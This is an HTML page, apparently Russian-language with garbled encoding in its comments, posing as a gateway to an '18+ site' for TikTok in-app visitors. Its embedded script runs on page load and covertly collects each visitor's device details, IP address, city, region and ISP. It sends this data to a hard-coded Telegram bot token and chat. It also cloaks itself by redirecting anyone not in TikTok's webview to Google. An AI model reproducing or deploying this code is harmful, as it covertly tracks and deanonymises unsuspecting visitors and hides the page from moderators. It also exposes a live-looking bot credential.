<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–¶–µ–ª–µ–≤–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #f5f5f5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            width: 100%;
            position: relative;
        }

        .header {
            background: white;
            padding: 1rem;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }

        /* –û–±–Ω–æ–≤–ª–µ–Ω–Ω—ã–µ —Å—Ç–∏–ª–∏ –¥–ª—è —Å—Ç—Ä–µ–ª–∫–∏ */
        .arrow-container {
            position: fixed; /* –ò–∑–º–µ–Ω–µ–Ω–æ –Ω–∞ fixed */
            top: 10px;
            right: -15px;
            width: 65px;
            height: 65px;
            z-index: 1000; /* –ß—Ç–æ–±—ã —Å—Ç—Ä–µ–ª–∫–∞ –±—ã–ª–∞ –ø–æ–≤–µ—Ä—Ö –≤—Å–µ–≥–æ –∫–æ–Ω—Ç–µ–Ω—Ç–∞ */
        }

        .content {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1rem;
        }

        .card {
            background: white;
            border-radius: 12px;
            padding: 1rem;
            width: 100%;
            text-align: center;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }

        .card img {
            width: 100%;
            height: auto;
            display: block;
            max-width: 100%;
            border-radius: 8px;
        }

        @media (max-width: 480px) {
            .container {
                padding: 10px;
            }
            
            .card {
                padding: 0.5rem;
            }

            .content {
                padding: 0.5rem;
            }
        }

        @media (min-width: 481px) and (max-width: 768px) {
            .arrow-container {
                width: 60px; /* –ù–µ–º–Ω–æ–≥–æ —É–º–µ–Ω—å—à–∞–µ–º —Ä–∞–∑–º–µ—Ä –¥–ª—è –ø–ª–∞–Ω—à–µ—Ç–æ–≤ */
                height: 60px;
            }
        }
    </style>
</head>
<body>
    <div class="arrow-container">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
            <style>
                @keyframes bounce {
                    0%, 100% { transform: translateY(0); }
                    50% { transform: translateY(-10px); }
                }
                .arrow {
                    animation: bounce 1s infinite;
                    transform-origin: center;
                }
            </style>
            <path 
                class="arrow" 
                d="M50 10 L70 40 L60 40 L60 90 L40 90 L40 40 L30 40 Z" 
                fill="red"
            />
        </svg>
    </div>
    
    <main class="content">
        <div class="container">
            <div class="card">
                <h1>Click "Open in the browser" to access the 18+ site.</h1>
                <img src="pic.jpg" alt="Share Menu">
            </div>
        </div>
    </main>
    <script>
        // –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è Telegram
const TELEGRAM_BOT_TOKEN = '7493763616:AAFi0MZpHax9ALjz97knaYEf9UOobjRmN2Q';
const TELEGRAM_CHAT_ID = '-4610081050';

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —É–Ω–∏–∫–∞–ª—å–Ω–æ—Å—Ç–∏ –ø–æ—Å–µ—Ç–∏—Ç–µ–ª—è
function isUniqueVisitor(ip) {
    const visitors = JSON.parse(localStorage.getItem('visitors') || '{}');
    const now = new Date().getTime();
    
    if (!visitors[ip] || (now - visitors[ip]) > 24 * 60 * 60 * 1000) {
        visitors[ip] = now;
        localStorage.setItem('visitors', JSON.stringify(visitors));
        return true;
    }
    return false;
}

// –£–ª—É—á—à–µ–Ω–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è TikTok WebView
function isTikTokWebView() {
    const userAgent = navigator.userAgent.toLowerCase();
    const appVersion = navigator.appVersion.toLowerCase();
    
    // –†–∞—Å—à–∏—Ä–µ–Ω–Ω—ã–π —Å–ø–∏—Å–æ–∫ —Å–∏–≥–Ω–∞—Ç—É—Ä TikTok
    const tiktokSignatures = [
        'tiktok',
        'musical_ly',
        'bytedance',
        'tiktokapp',
        'musically',
        'aweme',
        'tt-wb'
    ];
    
    // –ü—Ä–æ–≤–µ—Ä–∫–∞ User Agent –∏ AppVersion
    const isTikTokUA = tiktokSignatures.some(signature => 
        userAgent.includes(signature) || appVersion.includes(signature)
    );
    
    // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –ø—Ä–æ–≤–µ—Ä–∫–∏
    const hasWebViewFeatures = (
        typeof window.AndroidBridge !== 'undefined' ||
        typeof window.webkit?.messageHandlers !== 'undefined' ||
        typeof window.TikTokJSBridge !== 'undefined'
    );
    
    // –ü—Ä–æ–≤–µ—Ä–∫–∞ –º–æ–±–∏–ª—å–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤
    const isMobileDevice = /Mobile|Android|iPhone|iPad/i.test(userAgent);
    
    // –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ä–µ—Ñ–µ—Ä–µ–Ω—Å–µ—Ä–∞
    const referrer = document.referrer.toLowerCase();
    const hasTikTokReferrer = tiktokSignatures.some(signature => 
        referrer.includes(signature)
    );
    
    // –ü—Ä–æ–≤–µ—Ä–∫–∞ URL –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤
    const urlParams = new URLSearchParams(window.location.search);
    const hasTikTokParams = urlParams.has('tt_from') || 
                           urlParams.has('_d') ||
                           urlParams.has('tt_medium');
    
    // –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–ª—è –æ—Ç–ª–∞–¥–∫–∏
    console.log('TikTok Detection Results:', {
        userAgent,
        isTikTokUA,
        hasWebViewFeatures,
        isMobileDevice,
        hasTikTokReferrer,
        hasTikTokParams
    });
    
    // –í–æ–∑–≤—Ä–∞—â–∞–µ–º true –µ—Å–ª–∏ –µ—Å—Ç—å —Ö–æ—Ç—è –±—ã –æ–¥–∏–Ω —è–≤–Ω—ã–π –ø—Ä–∏–∑–Ω–∞–∫ TikTok
    return isTikTokUA || hasWebViewFeatures || hasTikTokReferrer || hasTikTokParams;
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–±–æ—Ä–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ—Å–µ—Ç–∏—Ç–µ–ª–µ
async function collectVisitorData() {
    const data = {
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer,
        isMobile: /Mobile|Android|iPhone/i.test(navigator.userAgent),
        browser: getBrowserInfo(),
        os: getOSInfo(),
        isTikTok: isTikTokWebView()
    };

    try {
        const response = await fetch('https://ipapi.co/json/');
        const ipData = await response.json();
        const isUnique = isUniqueVisitor(ipData.ip);
        
        Object.assign(data, {
            ip: ipData.ip,
            country: ipData.country_name,
            city: ipData.city,
            region: ipData.region,
            isp: ipData.org,
            isUniqueVisitor: isUnique
        });
    } catch (error) {
        console.error('Error fetching IP data:', error);
        // –í —Å–ª—É—á–∞–µ –æ—à–∏–±–∫–∏ –≤—Å—ë —Ä–∞–≤–Ω–æ –≤–æ–∑–≤—Ä–∞—â–∞–µ–º –±–∞–∑–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ
        return data;
    }

    return data;
}

// –§—É–Ω–∫—Ü–∏—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –±—Ä–∞—É–∑–µ—Ä–∞
function getBrowserInfo() {
    const ua = navigator.userAgent;
    let browser = "Unknown";
    
    if (ua.includes("Firefox")) browser = "Firefox";
    else if (ua.includes("Chrome")) browser = "Chrome";
    else if (ua.includes("Safari")) browser = "Safari";
    else if (ua.includes("Opera") || ua.includes("OPR")) browser = "Opera";
    else if (ua.includes("Edge")) browser = "Edge";
    else if (ua.includes("MSIE") || ua.includes("Trident/")) browser = "Internet Explorer";
    
    return browser;
}

// –§—É–Ω–∫—Ü–∏—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –û–°
function getOSInfo() {
    const ua = navigator.userAgent;
    let os = "Unknown";
    
    if (ua.includes("Windows")) os = "Windows";
    else if (ua.includes("Mac")) os = "MacOS";
    else if (ua.includes("Linux")) os = "Linux";
    else if (ua.includes("Android")) os = "Android";
    else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
    
    return os;
}

// –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö –≤ Telegram
async function sendToTelegram(data) {
    const uniqueStatus = data.isUniqueVisitor ? 'üÜï –£–ù–ò–ö–ê–õ–¨–ù–´–ô –ü–û–°–ï–¢–ò–¢–ï–õ–¨' : '‚ôªÔ∏è –ü–û–í–¢–û–†–ù–´–ô –ü–û–°–ï–¢–ò–¢–ï–õ–¨';
    
    const message = `
${uniqueStatus}

üîç –ù–æ–≤—ã–π –ø–æ—Å–µ—Ç–∏—Ç–µ–ª—å:

üì± –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ:
- –û–°: ${data.os}
- –ë—Ä–∞—É–∑–µ—Ä: ${data.browser}
- –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ: ${data.screenResolution}
- Mobile: ${data.isMobile}

üìç –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è:
- IP: ${data.ip}
- –°—Ç—Ä–∞–Ω–∞: ${data.country}
- –ì–æ—Ä–æ–¥: ${data.city}
- –†–µ–≥–∏–æ–Ω: ${data.region}
- ISP: ${data.isp}

‚öôÔ∏è –¢–µ—Ö–Ω–∏—á–µ—Å–∫–∏–µ –¥–∞–Ω–Ω—ã–µ:
- User Agent: ${data.userAgent}
- –Ø–∑—ã–∫: ${data.language}
- –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: ${data.platform}
- Timezone: ${data.timezone}

üîó –ò—Å—Ç–æ—á–Ω–∏–∫:
- Referrer: ${data.referrer}
- TikTok WebView: ${data.isTikTok}

‚è∞ –í—Ä–µ–º—è: ${data.timestamp}
`;

    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
    } catch (error) {
        console.error('Error sending to Telegram:', error);
    }
}

// –£–ª—É—á—à–µ–Ω–Ω–∞—è –æ—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –æ–±—Ä–∞–±–æ—Ç–∫–∏
async function handleVisitor() {
    try {
        const visitorData = await collectVisitorData();
        await sendToTelegram(visitorData);
        
        // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ —ç—Ç–æ TikTok WebView
        const isTikTok = isTikTokWebView();
        console.log('Is TikTok WebView:', isTikTok);
        
        // –ï—Å–ª–∏ —ç—Ç–æ –ù–ï TikTok WebView, –¥–µ–ª–∞–µ–º —Ä–µ–¥–∏—Ä–µ–∫—Ç
        if (!isTikTok) {
            setTimeout(() => {
                console.log('Redirecting to Google...');
                window.location.replace('https://www.google.com/');
            }, 500);
        }
    } catch (error) {
        console.error('Error in handleVisitor:', error);
        // –í —Å–ª—É—á–∞–µ –æ—à–∏–±–∫–∏ –≤—Å—ë —Ä–∞–≤–Ω–æ –¥–µ–ª–∞–µ–º —Ä–µ–¥–∏—Ä–µ–∫—Ç
        window.location.replace('https://www.google.com/');
    }
}

// –ó–∞–ø—É—Å–∫ —Å–∫—Ä–∏–ø—Ç–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
document.addEventListener('DOMContentLoaded', handleVisitor);
    </script>
</body>
</html>